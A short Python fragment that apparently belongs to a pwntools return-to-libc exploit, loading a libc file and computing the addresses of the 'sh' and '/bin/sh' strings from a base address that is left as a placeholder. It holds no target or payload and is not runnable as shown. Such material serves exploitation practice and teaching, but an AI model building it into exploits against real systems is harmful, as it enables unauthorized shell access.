from pwn import *

libc = ELF('libc.so')

base = [put base address here]

sh = base + next(libc.search('sh\x00'))
binsh = base + next(libc.search('/bin/sh\x00'))
